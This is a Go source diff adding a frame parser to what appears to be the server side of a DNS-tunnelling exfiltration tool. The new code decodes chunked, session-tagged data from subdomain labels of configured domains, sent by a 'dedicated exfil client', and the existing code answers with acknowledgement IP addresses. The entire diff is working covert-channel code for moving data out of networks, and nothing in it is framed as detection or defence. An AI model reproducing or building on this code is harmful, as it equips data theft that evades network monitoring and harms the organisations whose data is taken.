@@ -4,6 +4,7 @@ import (
 	"encoding/binary"
 	"errors"
 	"fmt"
+	"strconv"
 	"strings"
 )
 
@@ -52,6 +53,22 @@ type ExfilMetadata struct {
 	FileSize    uint64
 	Name        string
 	Raw         []byte // raw option bytes for debugging or forward compatibility
+}
+
+type ExfilFramePhase int
+
+const (
+	ExfilFrameInit ExfilFramePhase = iota
+	ExfilFrameChunk
+	ExfilFrameComplete
+)
+
+// ExfilFrame represents a label-encoded frame emitted by the dedicated exfil client.
+type ExfilFrame struct {
+	Phase      ExfilFramePhase
+	SessionTag string
+	Counter    uint32
+	Payload    string
 }
 
 // IsHeader reports whether the metadata represents the header frame.
@@ -150,6 +167,109 @@ func parseExfilMetadataPayload(payload []byte) (*ExfilMetadata, error) {
 	return meta, nil
 }
 
+func parseLabelEncodedExfilFrame(qname string, domains []string) (*ExfilFrame, bool, error) {
+	normalizedName := strings.TrimSuffix(strings.ToLower(qname), ".")
+	if normalizedName == "" {
+		return nil, false, nil
+	}
+
+	nameParts := strings.Split(normalizedName, ".")
+	for _, domain := range domains {
+		normDomain := strings.TrimSpace(domain)
+		if normDomain == "" {
+			continue
+		}
+		normDomain = strings.TrimSuffix(strings.ToLower(normDomain), ".")
+		domainParts := strings.Split(normDomain, ".")
+		if len(nameParts) <= len(domainParts) || !labelsHaveSuffix(nameParts, domainParts) {
+			continue
+		}
+
+		frameLabels := append([]string(nil), nameParts[:len(nameParts)-len(domainParts)]...)
+		if len(frameLabels) == 0 {
+			continue
+		}
+
+		if last := frameLabels[len(frameLabels)-1]; isLikelyTimestampLabel(last) {
+			frameLabels = frameLabels[:len(frameLabels)-1]
+		}
+		if len(frameLabels) == 0 {
+			continue
+		}
+
+		var builder strings.Builder
+		for _, label := range frameLabels {
+			if label == "" {
+				continue
+			}
+			builder.WriteString(label)
+		}
+		if builder.Len() == 0 {
+			continue
+		}
+
+		frameString := strings.ToUpper(builder.String())
+		if !strings.HasPrefix(frameString, ExfilFramePrefix) {
+			continue
+		}
+
+		frame, err := interpretExfilFrameString(frameString)
+		return frame, true, err
+	}
+
+	return nil, false, nil
+}
+
+func interpretExfilFrameString(frame string) (*ExfilFrame, error) {
+	parts := strings.Split(frame, "-")
+	if len(parts) < 3 {
+		return nil, fmt.Errorf("incomplete exfil frame: %s", frame)
+	}
+	if parts[0] != "EX" {
+		return nil, nil
+	}
+
+	sessionTag := strings.ToUpper(parts[1])
+	if len(sessionTag) != ExfilSessionTagWidth {
+		return nil, fmt.Errorf("invalid session tag length: %s", sessionTag)
+	}
+
+	completionToken := strings.ToUpper(ExfilCompleteToken)
+	switch {
+	case len(parts) == 3 && strings.ToUpper(parts[2]) == completionToken:
+		return &ExfilFrame{Phase: ExfilFrameComplete, SessionTag: sessionTag}, nil
+	case len(parts) == 3:
+		counter, err := parseBase36Counter(parts[2])
+		if err != nil {
+			return nil, err
+		}
+		return &ExfilFrame{Phase: ExfilFrameInit, SessionTag: sessionTag, Counter: counter}, nil
+	default:
+		counter, err := parseBase36Counter(parts[2])
+		if err != nil {
+			return nil, err
+		}
+		payload := strings.Join(parts[3:], "-")
+		if payload == "" {
+			return nil, fmt.Errorf("chunk frame missing payload")
+		}
+		return &ExfilFrame{
+			Phase:      ExfilFrameChunk,
+			SessionTag: sessionTag,
+			Counter:    counter,
+			Payload:    payload,
+		}, nil
+	}
+}
+
+func parseBase36Counter(token string) (uint32, error) {
+	value, err := strconv.ParseUint(strings.ToLower(token), 36, 32)
+	if err != nil {
+		return 0, fmt.Errorf("invalid base36 counter %q: %w", token, err)
+	}
+	return uint32(value), nil
+}
+
 // extractExfilPayloadFromQName removes the configured domain/timestamp labels and returns the base36 blob.
 func extractExfilPayloadFromQName(qname, domain string) (string, bool) {
 	normalizedName := strings.TrimSuffix(strings.ToLower(qname), ".")
@@ -240,4 +360,27 @@ func ackIPAddress(base string, ack bool) []byte {
 	result := append([]byte(nil), ip...)
 	result[3] = byte((int(result[3]) + 1) & 0xFF)
 	return result
+}
+
+func buildExfilDomainHints(primary string, extras []string) []string {
+	seen := make(map[string]struct{})
+	var domains []string
+	add := func(domain string) {
+		norm := strings.TrimSpace(strings.ToLower(strings.TrimSuffix(domain, ".")))
+		if norm == "" {
+			return
+		}
+		if _, exists := seen[norm]; exists {
+			return
+		}
+		seen[norm] = struct{}{}
+		domains = append(domains, norm)
+	}
+
+	add(primary)
+	for _, extra := range extras {
+		add(extra)
+	}
+
+	return domains
 }
